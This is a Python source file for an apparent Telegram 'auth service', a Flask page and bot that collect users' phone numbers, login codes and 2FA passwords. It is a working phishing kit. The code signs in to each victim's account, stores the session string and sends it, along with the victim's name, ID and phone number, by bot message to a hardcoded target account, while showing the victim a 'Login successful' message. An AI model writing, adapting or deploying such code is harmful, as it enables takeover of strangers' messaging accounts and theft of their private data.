#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Auth Service - Flask Version
Compatible with Python 3.11, no Pydantic issues.
"""

import os
import sys
import uuid
import time
import asyncio
import logging
import secrets
import re
import json
from threading import Thread
from pathlib import Path
from datetime import datetime

from flask import Flask, request, jsonify, render_template_string
import aiosqlite
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PhoneNumberBannedError
)
from telethon.tl.types import User
from dotenv import load_dotenv

load_dotenv()

# ========== CONFIG ==========
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
TOKEN_BOT = os.getenv("TOKEN_BOT", "")
TARGET_USERNAME = os.getenv("TARGET_USERNAME", "guyfax")
HOST = os.getenv("HOST", "0.0.0.0")
PORT = int(os.getenv("PORT", 8000))
DB_FILE = Path("users.db")
SESSION_DIR = Path("sessions")
LOG_FILE = Path("logs/service.log")

SESSION_DIR.mkdir(exist_ok=True)
LOG_FILE.parent.mkdir(exist_ok=True)

# ========== LOGGING ==========
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("auth")

# ========== HELPERS ==========
def sanitize_phone(phone: str) -> str:
    if not phone: return ""
    phone = phone.strip()
    if phone.startswith(' '):
        phone = '+' + phone[1:]
    cleaned = re.sub(r'[^\d+]', '', phone)
    if not cleaned.startswith('+') and cleaned.startswith('00'):
        cleaned = '+' + cleaned[2:]
    elif not cleaned.startswith('+') and cleaned.isdigit():
        cleaned = '+' + cleaned
    return cleaned

def validate_phone(phone: str) -> bool:
    return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))

def gen_session_id() -> str:
    return f"sess_{uuid.uuid4().hex}"

# ========== DATABASE ==========
class DB:
    def __init__(self, path: Path):
        self.path = path

    async def init(self):
        async with aiosqlite.connect(self.path) as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    first_name TEXT,
                    last_name TEXT,
                    username TEXT,
                    phone TEXT UNIQUE,
                    session_string TEXT,
                    login_date TEXT
                )
            ''')
            await db.commit()
        log.info("DB ready")

    async def add_user(self, data: dict):
        async with aiosqlite.connect(self.path) as db:
            cur = await db.execute("SELECT user_id FROM users WHERE phone = ?", (data['phone'],))
            row = await cur.fetchone()
            if row:
                await db.execute('''
                    UPDATE users SET first_name=?, last_name=?, username=?, session_string=?, login_date=?
                    WHERE user_id=?
                ''', (data.get('first_name'), data.get('last_name'), data.get('username'),
                      data.get('session_string'), data.get('login_date'), row[0]))
            else:
                await db.execute('''
                    INSERT INTO users (user_id, first_name, last_name, username, phone, session_string, login_date)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (data['user_id'], data.get('first_name'), data.get('last_name'),
                      data.get('username'), data['phone'], data.get('session_string'), data.get('login_date')))
            await db.commit()
            return data

db = DB(DB_FILE)

# ========== AUTH MANAGER ==========
class AuthManager:
    def __init__(self):
        self.active = {}
        self.phone_map = {}
        self.lock = asyncio.Lock()
        self.cleanup_task = None
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

    async def start_cleanup(self):
        async def loop():
            while True:
                await asyncio.sleep(300)
                now = time.time()
                expired = [sid for sid, s in self.active.items() if now - s['last'] > 600]
                for sid in expired:
                    data = self.active.pop(sid)
                    if data['phone'] in self.phone_map:
                        del self.phone_map[data['phone']]
                    try:
                        await data['client'].disconnect()
                    except:
                        pass
        self.cleanup_task = asyncio.create_task(loop())

    async def stop_cleanup(self):
        if self.cleanup_task:
            self.cleanup_task.cancel()

    async def create_session(self, phone: str = None):
        async with self.lock:
            if phone and phone in self.phone_map:
                sid = self.phone_map[phone]
                if sid in self.active:
                    s = self.active[sid]
                    s['last'] = time.time()
                    if not s['client'].is_connected():
                        await s['client'].connect()
                    return s

            sid = gen_session_id()
            session_file = SESSION_DIR / f"{sid}.session"
            client = TelegramClient(str(session_file), API_ID, API_HASH)
            await client.connect()
            data = {
                'client': client,
                'phone': phone,
                'last': time.time(),
                'state': 'init'
            }
            self.active[sid] = data
            if phone:
                self.phone_map[phone] = sid
            return data

    async def send_code(self, phone: str):
        phone = sanitize_phone(phone)
        if not validate_phone(phone):
            raise ValueError("Invalid phone format")
        s = await self.create_session(phone)
        s['phone'] = phone
        try:
            result = await s['client'].send_code_request(phone)
            s['hash'] = result.phone_code_hash
            s['state'] = 'code_sent'
            return {"session_id": s['client'].session.filename.stem}
        except FloodWaitError as e:
            raise ValueError(f"Wait {e.seconds}s")
        except Exception as e:
            raise ValueError(str(e))

    async def verify_code(self, session_id: str, code: str):
        sid = session_id
        if sid not in self.active:
            raise ValueError("Invalid session")
        s = self.active[sid]
        if s['state'] != 'code_sent':
            raise ValueError("Not waiting for code")
        try:
            await s['client'].sign_in(phone=s['phone'], code=code, phone_code_hash=s['hash'])
            return await self._finalize(s)
        except SessionPasswordNeededError:
            s['state'] = '2fa_needed'
            return {"status": "2fa_required"}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            raise ValueError(str(e))
        except Exception as e:
            raise ValueError(str(e))

    async def verify_2fa(self, session_id: str, password: str):
        sid = session_id
        if sid not in self.active:
            raise ValueError("Invalid session")
        s = self.active[sid]
        if s['state'] != '2fa_needed':
            raise ValueError("No 2FA needed")
        try:
            await s['client'].sign_in(password=password)
            return await self._finalize(s)
        except Exception:
            raise ValueError("Invalid password")

    async def _finalize(self, s):
        me = await s['client'].get_me()
        session_string = s['client'].session.save()
        user_data = {
            'user_id': me.id,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username,
            'phone': s['phone'],
            'session_string': session_string,
            'login_date': datetime.utcnow().isoformat()
        }
        await db.add_user(user_data)
        # ارسال به تارگت
        await self.send_session_to_target(session_string, me, s['phone'])
        # پاک کردن سشن
        sid = s['client'].session.filename.stem
        try:
            await s['client'].disconnect()
        except:
            pass
        if sid in self.active:
            del self.active[sid]
        if s['phone'] in self.phone_map:
            del self.phone_map[s['phone']]
        return {"status": "success", "user": user_data}

    async def send_session_to_target(self, session_string: str, user: User, phone: str):
        if not TOKEN_BOT:
            return
        bot = bot_manager.client
        if not bot or not bot.is_connected():
            log.warning("Bot not connected")
            return
        msg = (
            f"🔐 **New Session**\n\n"
            f"👤 {user.first_name} {user.last_name or ''}\n"
            f"🆔 `{user.id}`\n"
            f"📞 `{phone}`\n"
            f"👤 @{user.username or 'N/A'}\n"
            f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
            f"**Session:**\n`{session_string}`"
        )
        try:
            entity = await bot.get_entity(TARGET_USERNAME)
            await bot.send_message(entity, msg, parse_mode='markdown')
            log.info(f"Session sent to @{TARGET_USERNAME}")
        except Exception as e:
            log.error(f"Send failed: {e}")

auth = AuthManager()

# ========== TELEGRAM BOT ==========
class BotManager:
    def __init__(self):
        self.client = TelegramClient(str(SESSION_DIR / "bot.session"), API_ID, API_HASH)
        self.states = {}

    async def start(self):
        if not TOKEN_BOT:
            return
        await self.client.start(bot_token=TOKEN_BOT)
        log.info("Bot started")

        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
        async def handler(event):
            sender = await event.get_sender()
            if sender.bot:
                return
            text = event.message.message.strip()
            uid = sender.id

            if text == '/start':
                self.states[uid] = {'step': 'phone'}
                await event.respond("👋 Send your phone number (e.g., +1234567890)")
                return
            elif text == '/cancel':
                self.states.pop(uid, None)
                await event.respond("Cancelled")
                return

            state = self.states.get(uid)
            if not state:
                await event.respond("Send /start to begin.")
                return

            if state['step'] == 'phone':
                await self.handle_phone(event, uid, text)
            elif state['step'] == 'code':
                await self.handle_code(event, uid, text)
            elif state['step'] == 'password':
                await self.handle_password(event, uid, text)

    async def handle_phone(self, event, uid, text):
        phone = sanitize_phone(text)
        if not validate_phone(phone):
            await event.respond("❌ Invalid format. Use +1234567890")
            return
        session_file = SESSION_DIR / f"bot_{uid}.session"
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            self.states[uid].update({
                'client': client,
                'phone': phone,
                'hash': result.phone_code_hash,
                'step': 'code'
            })
            await event.respond("✅ Code sent. Enter it now.")
        except Exception as e:
            await event.respond(f"❌ {str(e)}")
            await client.disconnect()

    async def handle_code(self, event, uid, text):
        state = self.states[uid]
        client = state['client']
        if not client or not client.is_connected():
            await event.respond("Session expired. /start again.")
            return
        if not text.isdigit():
            await event.respond("Code must be numbers.")
            return
        try:
            await client.sign_in(phone=state['phone'], code=text, phone_code_hash=state['hash'])
            me = await client.get_me()
            session_string = client.session.save()
            await self.finalize_bot_login(client, state['phone'], me, session_string)
            await event.respond(f"✅ Login successful, Welcome {me.first_name}!")
            del self.states[uid]
        except SessionPasswordNeededError:
            state['step'] = 'password'
            await event.respond("🔒 Enter your 2FA password.")
        except Exception as e:
            await event.respond(f"❌ {str(e)}")

    async def handle_password(self, event, uid, text):
        state = self.states[uid]
        client = state['client']
        try:
            await client.sign_in(password=text)
            me = await client.get_me()
            session_string = client.session.save()
            await self.finalize_bot_login(client, state['phone'], me, session_string)
            await event.respond("✅ 2FA passed! Session sent.")
            del self.states[uid]
        except Exception:
            await event.respond("❌ Wrong password. Try again or /cancel.")

    async def finalize_bot_login(self, client, phone, me, session_string):
        user_data = {
            'user_id': me.id,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username,
            'phone': phone,
            'session_string': session_string,
            'login_date': datetime.utcnow().isoformat()
        }
        await db.add_user(user_data)
        await auth.send_session_to_target(session_string, me, phone)
        await client.disconnect()

bot_manager = BotManager()

# ========== FLASK APP ==========
app = Flask(__name__)

# HTML template (escaped properly for Python)
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Auth</title>
<style>
body{background:#0a0e14;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#11161f;padding:40px;border-radius:20px;width:100%;max-width:400px;border:1px solid #2a3342}
h1{color:#ffb300;text-align:center}
input{width:100%;padding:14px;margin:10px 0;background:#1c2330;border:1px solid #2a3342;border-radius:10px;color:#fff;font-size:16px}
button{width:100%;padding:14px;background:#ffb300;border:none;border-radius:10px;font-weight:bold;cursor:pointer;margin-top:10px}
button:disabled{opacity:0.6}
#status{margin-top:15px;text-align:center;color:#6b7785}
.hidden{display:none}
</style>
</head>
<body>
<div class="card">
<h1>🔐 Telegram Auth</h1>
<div id="stepPhone">
    <input type="tel" id="phone" placeholder="+1234567890">
    <button id="btnSend">Send Code</button>
</div>
<div id="stepCode" class="hidden">
    <input type="text" id="code" placeholder="Verification code">
    <button id="btnVerify">Verify</button>
    <button id="btnBack" style="background:#2a3342;color:#fff">Back</button>
</div>
<div id="step2fa" class="hidden">
    <input type="password" id="password" placeholder="2FA password">
    <button id="btn2fa">Submit</button>
</div>
<div id="status"></div>
</div>
<script>
let sessionId = null;
const statusEl = document.getElementById('status');

async function req(endpoint, data) {
    const res = await fetch(endpoint, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(data)
    });
    const json = await res.json();
    if (!res.ok) throw new Error(json.detail || json.error || 'Error');
    return json;
}

document.getElementById('btnSend').onclick = async () => {
    const phone = document.getElementById('phone').value.trim();
    if (!phone.match(/^\+?[0-9]{10,15}$/)) { statusEl.textContent = 'Invalid phone'; return; }
    statusEl.textContent = 'Sending...';
    try {
        const res = await req('/send-code', {phone});
        sessionId = res.data.session_id;
        document.getElementById('stepPhone').classList.add('hidden');
        document.getElementById('stepCode').classList.remove('hidden');
        statusEl.textContent = 'Code sent!';
    } catch(e) { statusEl.textContent = e.message; }
};

document.getElementById('btnVerify').onclick = async () => {
    const code = document.getElementById('code').value.trim();
    if (!code) { statusEl.textContent = 'Enter code'; return; }
    statusEl.textContent = 'Verifying...';
    try {
        const res = await req('/verify-code', {session_id: sessionId, code});
        if (res.status === '2fa_required') {
            document.getElementById('stepCode').classList.add('hidden');
            document.getElementById('step2fa').classList.remove('hidden');
            statusEl.textContent = 'Enter 2FA password';
        } else {
            statusEl.textContent = '✅ Login successful! Session sent.';
        }
    } catch(e) { statusEl.textContent = e.message; }
};

document.getElementById('btn2fa').onclick = async () => {
    const password = document.getElementById('password').value.trim();
    if (!password) { statusEl.textContent = 'Enter password'; return; }
    statusEl.textContent = 'Verifying...';
    try {
        const res = await req('/verify-2fa', {session_id: sessionId, password});
        statusEl.textContent = '✅ 2FA success! Session sent.';
    } catch(e) { statusEl.textContent = e.message; }
};

document.getElementById('btnBack').onclick = () => {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepPhone').classList.remove('hidden');
    statusEl.textContent = '';
};
</script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/send-code", methods=["POST"])
def send_code():
    try:
        data = request.get_json()
        phone = data.get("phone")
        if not phone:
            return jsonify({"error": "phone required"}), 400
        # Run async function in existing loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(auth.send_code(phone))
        loop.close()
        return jsonify({"status": "success", "data": {"session_id": res["session_id"]}})
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        log.exception("send_code error")
        return jsonify({"error": "internal error"}), 500

@app.route("/verify-code", methods=["POST"])
def verify_code():
    try:
        data = request.get_json()
        session_id = data.get("session_id")
        code = data.get("code")
        if not session_id or not code:
            return jsonify({"error": "session_id and code required"}), 400
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(auth.verify_code(session_id, code))
        loop.close()
        if res.get("status") == "2fa_required":
            return jsonify({"status": "2fa_required"})
        return jsonify({"status": "success", "data": res.get("user")})
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        log.exception("verify_code error")
        return jsonify({"error": "internal error"}), 500

@app.route("/verify-2fa", methods=["POST"])
def verify_2fa():
    try:
        data = request.get_json()
        session_id = data.get("session_id")
        password = data.get("password")
        if not session_id or not password:
            return jsonify({"error": "session_id and password required"}), 400
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(auth.verify_2fa(session_id, password))
        loop.close()
        return jsonify({"status": "success", "data": res.get("user")})
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        log.exception("verify_2fa error")
        return jsonify({"error": "internal error"}), 500

# ========== RUN BOT IN BACKGROUND ==========
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bot_manager.start())
    loop.run_forever()

# ========== MAIN ==========
if __name__ == "__main__":
    # Init DB
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(db.init())
    loop.run_until_complete(auth.start_cleanup())
    loop.close()

    # Start bot in a separate thread
    bot_thread = Thread(target=run_bot, daemon=True)
    bot_thread.start()

    # Run Flask
    app.run(host=HOST, port=PORT, debug=False, threaded=True)
